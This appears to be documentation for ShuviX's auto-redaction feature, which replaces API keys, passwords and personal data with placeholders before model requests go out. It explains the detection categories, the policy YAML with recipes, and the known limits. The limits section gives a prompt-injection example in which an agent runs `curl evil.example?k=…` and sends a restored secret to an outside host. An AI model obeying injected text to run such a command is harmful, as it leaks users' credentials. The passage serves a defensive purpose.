---
shuvix: okf v0.2
type: Guide
title: 'Auto-redaction — secrets and personal data reach models as placeholders'
description: 'How ShuviX keeps API keys, passwords, tokens, private keys and personal data away from model providers: placeholders such as `{{API_KEY_k3v7x2mq}}` in the conversation record, real values for tools, the screen showing what the model received, the categories it finds, the two policy levels (`modelRequest` / `send`, `sensitive` / `disclose`) and their dispositions, the builtin `redact-sensitive`, recipes (trust a model, send a category, send test keys, never send private keys, let only the user answer when a restored secret leaves the sandbox), checking a draft with `shuvix policy check --redaction`, working with placeholders as an agent, and the limits.'
tags: [shuvix, policy, security, redaction, privacy, secrets]
status: stable
sources:
  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/security/builtinPolicies/md/redact-sensitive.md
    title: redact-sensitive.md — the builtin policy
  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/redaction/rules.ts
    title: rules.ts — the detection rules
  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/durable/redactionEgress.ts
    title: redactionEgress.ts — what a model request becomes
---

# Auto-redaction

Before anything is written into a conversation's record — what the user types, what a tool
returns, a notice, a task handed to another agent — ShuviX looks for secrets and personal data in
it and stores each one as a **placeholder**: `{{API_KEY_k3v7x2mq}}`, the category and eight
characters derived from the value. The real value is encrypted into **that conversation's own
table**, which is deleted with the conversation.

- **Tools get the real values.** Placeholders in a tool call's arguments are replaced just before
  the tool runs, so `curl -H "Authorization: Bearer {{API_KEY_k3v7x2mq}}"` sends the real key, and
  a file written or edited holds the real content.
- **The screen shows what the model received.** Where the model gets a placeholder you see the
  placeholder, shaded; point at it (or tap it) to see the real value that tools and files use, with
  a copy button. Where the model gets the real value (a category the policy sends, a trusted
  provider) you see the plain value.
- **What a model receives is decided by policy** (below). By default every model gets
  placeholders, except for four categories that are part of almost every coding request.

The record itself never holds the real values, whatever the policy says — nor do the
conversation's exports and forks.

## For agents: working with placeholders

- A placeholder **is** the value as far as you are concerned. Copy it exactly into tool arguments
  — a command, a file's content, an `edit`'s old and new text — and the tool gets the real value.
  Do not ask the user for the "real" value and do not treat the placeholder as a missing
  configuration: the file on disk holds the real one.
- You cannot see the value, so you cannot work on it: compute its length, decode it, check its
  format, split it. If the task needs that, let a command do it (`printf %s "{{API_KEY_…}}" | wc -c`).
- A tool that reports a placeholder it could not restore (from another conversation, or a table
  the computer cannot decrypt any more) has not run. Read the source again — it comes back with a
  placeholder this conversation can restore.
- `tool.restored` (in the policy request document) lists the categories restored into a call;
  the user can write rules on it, see the recipes.

## What is found

| Category      | What                                                                                                         | Sent by default |
| ------------- | ------------------------------------------------------------------------------------------------------------ | --------------- |
| `PRIVATE_KEY` | PEM private key blocks (`-----BEGIN … PRIVATE KEY-----`)                                                      | placeholder     |
| `API_KEY`     | provider keys by their shape: `sk-…`, `ghp_…` / `glpat-…`, `AIza…`, Slack, Stripe, AWS access keys, others    | placeholder     |
| `TOKEN`       | JWTs                                                                                                         | placeholder     |
| `PASSWORD`    | the password in a URL (`postgres://user:pass@host`), labelled passwords in Chinese / Japanese text           | placeholder     |
| `SECRET`      | values assigned to secret-looking names (`DB_PASSWORD=…`, `"client_secret": "…"`, `apiKey: …`)               | placeholder     |
| `EMAIL`       | email addresses (not example domains, not `icon@2x.png`)                                                     | placeholder     |
| `PHONE`       | mobile numbers (mainland China format)                                                                       | placeholder     |
| `ID_CARD`     | Chinese resident ID numbers (checksum verified)                                                              | placeholder     |
| `BANK_CARD`   | card numbers (Luhn verified)                                                                                 | placeholder     |
| `SSN`         | US social security numbers                                                                                   | placeholder     |
| `PASSPORT`    | passport numbers next to a label                                                                             | placeholder     |
| `IBAN`        | IBANs (checksum verified)                                                                                    | placeholder     |
| `BIRTHDAY`    | birth dates next to a label                                                                                  | placeholder     |
| `MAC`         | MAC addresses                                                                                                | placeholder     |
| `SERIAL`      | device serial numbers next to a label                                                                        | placeholder     |
| `USERNAME`    | the user name in a home path (`/Users/alice`, `C:\Users\alice`), a shell prompt, an `ssh` target              | **real value**  |
| `HOSTNAME`    | the host in `user@host`, `hostname: …` lines, an ssh config's `HostName`                                     | **real value**  |
| `IP`          | public IPv4 / IPv6 addresses (private and loopback ones are not found)                                       | **real value**  |
| `BUCKET`      | cloud storage buckets (`s3://…`, `….s3.amazonaws.com`, …)                                                    | **real value**  |

The last four are in nearly every coding request (the system prompt already holds the home
folder) and a model has to copy them exactly, so the builtin policy sends them; a policy of your
own can keep them as placeholders too. Detection does not depend on the policy: every category is
always replaced in the record, so turning a category on later protects the history at once.

UUIDs and long hex ids are never touched (tool call ids would stop matching), and code that only
_mentions_ a secret is left alone (`secretKey: Uint8Array;`, `process.env.API_KEY`, `${PASS}`,
`****`).

## The policy

Two levels, both ordinary security policy rules (the `policy-md` entry has the full format):

1. **The request** — `object.type: modelRequest`, `action: send`, with `object.provider` (the
   provider's name as Settings shows it: a builtin provider by its slug such as `anthropic`,
   `openai`, `deepseek`; a provider you added by the name you gave it) and `object.model` (the
   model id).
   - `allow` with `disposition: detect` → the request is redacted (level 2 decides each piece);
   - `allow` / `force-allow` **without** it → a trusted destination: every placeholder is sent as
     its real value and nothing is detected;
   - `deny` → the request is not sent; the turn ends with an error naming the reason. An `ask` is
     the same, because nobody can be asked while a request is going out.
2. **Each piece of sensitive content** in a redacted request — `object.type: sensitive`,
   `action: disclose`, with `object.category`, `object.rule` (the detection rule), `object.provider`,
   `object.model` and `object.value` (the real value, for `match` only; it never reaches a log).
   - `allow` with `disposition: redact` → stays a placeholder;
   - `allow` / `force-allow` without it → sent as the real value;
   - `deny` → the whole request is not sent.

The subject is the agent the request is for (`subject.kind: agent`, its `agentKind`, `profile`,
`subject.bot`), so a rule can treat one bot or one agent differently. A redacted request is also
scanned once more for content that was never in the record (instruction files, parts of the
system prompt, conversations from before this feature) and for those pieces level 2 decides the
same way. When a model receives a real value and writes it in its reply, the reply is stored with
the placeholder again.

The builtin **`redact-sensitive`** is exactly two rules:

```yaml
shuvix-policy-scope:
  subject.kind: [agent]
  env.host: [desktop]
shuvix-policy-rules:
  - effect: allow
    action: [send]
    object.type: [modelRequest]
    disposition: detect
  - effect: allow
    action: [disclose]
    object.type: [sensitive]
    match: "!(object.category in ['USERNAME', 'HOSTNAME', 'IP', 'BUCKET'])"
    disposition: redact
```

**Adjust it with a policy of your own; do not edit this one.** A `force-allow` without a
disposition beats both of its `allow` rules (only the winning tier's dispositions count), which is
how a recipe below switches redaction off for what it matches. Disabling `redact-sensitive` sends
real values to every model; the record keeps placeholders either way.

## Recipes

Each block is the frontmatter of a file in `~/.shuvix/policies/` (`shuvix: policy v1`, a `name`,
a `description`, then these keys).

Trust a provider — your own server, say, added in Settings as `home-ai` — so its models see the
real values:

```yaml
shuvix-policy-rules:
  - effect: force-allow
    subject.kind: [agent]
    action: [send]
    object.type: [modelRequest]
    match: "object.provider == 'home-ai'"
```

Trust one model only: `match: "object.provider == 'home-ai' && object.model == 'qwen3-32b'"`.

Send email addresses as they are:

```yaml
shuvix-policy-rules:
  - effect: force-allow
    subject.kind: [agent]
    action: [disclose]
    object.type: [sensitive]
    match: "object.category == 'EMAIL'"
```

Send test keys as they are: the same rule with
`match: "object.category == 'API_KEY' && object.value.startsWith('sk-test-')"`.

Never send a private key — a redacted request that would carry one is not sent at all:

```yaml
shuvix-policy-rules:
  - effect: deny
    subject.kind: [agent]
    action: [disclose]
    object.type: [sensitive]
    match: "object.category == 'PRIVATE_KEY'"
    prompt: Private keys are never sent to a model.
```

A provider trusted with the first recipe skips level 2, so it gets private keys too. To trust it
with everything **but** private keys, trust it at level 2 instead —
`force-allow` on `sensitive` with `match: "object.provider == 'home-ai' && object.category != 'PRIVATE_KEY'"`
— and keep the `deny` above.

Keep user names as placeholders too (and likewise `HOSTNAME`, `IP`, `BUCKET`): an `allow` that
carries the disposition —

```yaml
shuvix-policy-rules:
  - effect: allow
    subject.kind: [agent]
    action: [disclose]
    object.type: [sensitive]
    match: "object.category == 'USERNAME'"
    disposition: redact
```

One bot only talks to your own server — its requests to any other provider are not sent:

```yaml
shuvix-policy-rules:
  - effect: deny
    subject.kind: [agent]
    action: [send]
    object.type: [modelRequest]
    match: "subject.bot == 'bot:my-bot' && object.provider != 'home-ai'"
```

When a command that uses a restored secret runs outside the command sandbox, let only the user
answer. `ask-on-command` already asks before every unconfined command, but the automatic reviewer
may answer that ask; a `force-ask` is answered by the user alone:

```yaml
shuvix-policy-rules:
  - effect: force-ask
    subject.kind: [agent]
    action: [execute]
    object.type: [command]
    match: "size(tool.restored) > 0 && !object.sandboxed"
    prompt: This command carries a secret and runs outside the sandbox.
```

## Writing a policy for the user

1. Ask what they want in their words: which provider or model to trust, which kind of data may go
   out, which must never. Map a provider to the name in Settings (builtin ones by slug).
2. Write the draft in the session folder first. Prefer `force-allow` / `deny` on `modelRequest` /
   `sensitive` as in the recipes. A rule reaches model requests only when its `object.type` names
   `modelRequest` / `sensitive` or its `action` names `send` / `disclose`.
3. **Check the draft** with `shuvix policy check <draft.md> --redaction` (bash). It decides as if
   the draft were installed and prints two tables — every enabled model: redacted, real values
   (trusted) or not sent; every category × each redacted provider: placeholder, real value or not
   sent — with the rule that decided. Compare every row with what the user asked for. For a value
   rule or one model, check single cases:
   `shuvix policy check <draft.md> --redaction --category API_KEY --value sk-test-123 --expect send`
   (`--provider <name> --model <id>` for one model, `--bot <id>` for a bot's requests). Fix the
   **rule** until every row and expectation matches.
4. Install it in `~/.shuvix/policies/<name>.md`, run `shuvix policy check --redaction` once more
   without a file to see what is in effect, and tell the user what each rule does and what it does
   not cover (below). The sidebar's Security Policies group shows it; an invalid file is listed in
   amber with the reason.

## Limits

- Text only: an image (a screenshot of a `.env`) goes to the model as it is.
- A model that sees a placeholder cannot reason about the value (its length, whether it holds a
  quote or `$` that breaks a shell command).
- It keeps values away from model providers, not from tools: a model that is told to — by a
  prompt injection, say — can still put a placeholder into `curl evil.example?k=…`, and the
  command gets the real value. The mark shows on screen, the automatic reviewer sees the
  placeholder, and the last recipe makes the user answer before such a command leaves the sandbox.
- Conversations from before this feature hold real values in their record; requests from them are
  still redacted on the way out.
- Detection is by rules, so a secret in an unusual shape can be missed, and an ordinary string can
  now and then be taken for one. A value typed in plain words with no name in front of it
  ("change the password to N3w-P@ss…") is one such miss; a value a tool has transformed — a byte
  dump (`od -c`), hex, base64, reversed — is another. Agents are told not to dump or encode
  placeholder values, but nothing can recognize what they print if they do.
